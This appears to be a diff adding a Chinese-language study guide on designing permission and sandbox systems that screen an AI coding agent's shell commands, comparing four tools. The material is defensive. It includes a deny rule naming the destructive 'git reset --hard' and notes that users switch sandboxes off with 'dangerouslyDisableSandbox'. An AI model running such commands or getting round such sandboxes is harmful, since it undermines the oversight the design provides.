+预期：用户体验下降（某些命令在 sandbox 里报权限错误），但事故率降到接近 0。
+
+**关键工程纪律**：
+
+1. **每个阶段都要有 metrics**：prompt 数除以命令数等于 prompt rate。deny 数除以命令数等于 deny rate。事故数等于实际出问题的次数。三个数字一起看才有意义。
+2. **不要跳阶段**。直接上 sandbox 没用：用户为了能干活会 `dangerouslyDisableSandbox`。
+3. **白名单和黑名单并存**：allowlist（永远放行）加 denylist（永远拦截）加 prompt（中间态）。三档比 boolean 表达力强 10 倍。
+
+类似项目：Anthropic 自己的 Claude Code 就是按这个梯度演进的：早期版本只有 sandbox-exec，后来加 `bashPermissionRule`，再后来加 23 项 security check，最后才加 GrowthBook 远程下发。半年时间走完。
+
+**源码参考**：四家的演进史在各自 changelog 里都能看到。Codex `execpolicy/CHANGELOG.md`、Hermes 的 git log。
+
+**追问**：「如果用户死活不愿意 prompt 怎么办？」答：给他们一个「信任模式」开关，但日志里明确标注 `trusted_mode=true`，用户自己签字。出事故时这个标记就是免责证据：既给了便利又划清了责任。
+</details>
+
+<details>
+<summary>**Q10 · 开放**：设计一份「shell 拦截系统的标准协议」，吸收四家精华。</summary>
+
+分层协议，每层都有清晰的接口和默认值：
+
+**Layer 1 · 解析（必须）**
+
+```typescript
+interface ParseResult {
+  tokens: string[];        // shlex 分词后
+  wrapper: 'sh' | 'bash' | 'eval' | 'find-exec' | null;
+  wrapped_command?: ParseResult;  // wrapper 里面的命令递归解析
+  obfuscation_signals: string[];  // ['base64', 'cmd-substitution', ...]
+}
+```
+
+参考 Codex 的 shlex 起步，加 wrapper 递归解析（OpenClaw 风格）加 obfuscation 信号（也是 OpenClaw）。第二阶段可选 tree-sitter（Claude Code 风格），但不是必须。
+
+**Layer 2 · 策略 DSL（推荐）**
+
+```python
+prefix_rule(
+    pattern=["git", "reset", "--hard"],
+    decision="forbidden",
+    justification="destructive: rewrites local history",
+    match=[["git", "reset", "--hard"]],
+    not_match=[["git", "reset", "--keep"]],
+)
+```
+
+参考 Codex execpolicy 起步。规则放独立文件，可 git diff，自带单测。决策档：`allow、prompt、forbidden`，最严赢。
+
+**Layer 3 · per-binary profile（高级）**
+
+```typescript
+interface SafeBinProfile {
+  binary: string;
+  allowed_flags: string[];        // ['--all', '-l', '-h']
+  denied_flags: string[];         // ['--force', '-f']
+  min_positional?: number;
+  max_positional?: number;
+  long_flag_abbreviations: 'expand' | 'reject';  // 参考 OpenClaw 的 --for 还原
+}
+```
+
+参考 OpenClaw safe-bin profile。只有真需要 fine-grained 控制的命令才写 profile（git、docker、kubectl 这种），ls、cat 不用。
+
+**Layer 4 · 审批通道（必须）**
+
+```typescript
+interface ApprovalRequest {
+  cmd: string;
+  justification: string;       // 来自规则
+  decision_history: string[];   // 之前类似命令的决策
+  ttl?: 'once' | 'session' | 'always';
+}
+
+interface ApprovalChannel {
+  send(req: ApprovalRequest): Promise<ApprovalDecision>;
+}
+```
+
+参考 Hermes callback 模式加 OpenClaw JSONL socket。CLI、IDE、IM 各实现一份。
+
+**Layer 5 · 执行隔离（必须）**
+
+```typescript
+interface ExecBackend {
+  spawn(parsed: ParseResult, opts: SpawnOpts): Promise<ExecResult>;
+}
+
+// 默认实现：local, sandbox-exec/bubblewrap, docker
+// 可扩展：modal, firecracker, gvisor
+```
+
+参考 Hermes 的多后端思路但精简到 3 种（local 加 sandbox 加 container）。不做 modal、daytona 这种小众的，留接口让用户自己加。
+
+**Layer 6 · 审计（必须）**
+
+```typescript
+interface AuditEvent {
+  ts: number;
+  parsed: ParseResult;
+  decision: 'allow' | 'prompt' | 'forbidden';
+  decision_source: string;       // 'rule:git-reset-hard' or 'allowlist' or 'default'
+  approval_decision?: string;
+  exec_backend: string;
+  exit_code?: number;
+  stdout_size?: number;
+  pii_check_ids: number[];       // 参考 Claude Code 数字 ID
+}
+```
+
+数字 ID 化（Claude Code 风格）加 JSONL 落盘加可对接 SIEM。
+
+**整体 API**
+
+```typescript
+const shellGuard = createShellGuard({
+  policy_file: './shell.policy',
+  default_decision: 'prompt',
+  safe_bin_profiles: ['./profiles/git.json', './profiles/docker.json'],
+  approval_channel: cliApprovalChannel(),
+  exec_backend: 'sandbox',
+  audit_sink: jsonlFileSink('./shell-audit.log'),
+});
+
+const result = await shellGuard.run('git push --force');
+// → { decision: 'prompt', justification: '...', approval_pending: true }
+```
+
+**优点**：
+
+- 每层独立，可单独测试。
+- 第一层 default deny，后面层是 defense in depth。
+- 数字 ID 审计加 PII 防泄漏。
+- 规则可 git diff，演进有审计。
+
+**对比四家**：
+
+- 比 Codex 多了 obfuscation detection 和 safe-bin profile。
+- 比 Claude Code 多了规则外置（不耦合到代码）。
+- 比 OpenClaw 多了 wrapper 递归解析。
+- 比 Hermes 多了细粒度命令层挡截。
+
+工程成本：3-4 人月加 1 月文档、测试。比从头写四家任意一家便宜。
+
+**源码组合**：参考四家 §3 实现拼装。
+
+**追问**：「这套协议跨语言怎么做？」答：核心 API 设计成 JSON in、out，每种语言（Rust、Go、TS、Python）各实现一份执行器，共享同一份规则文件加 safe-bin profile（JSON、Starlark）。Codex 的 Starlark 已经是这个思路。
+</details>
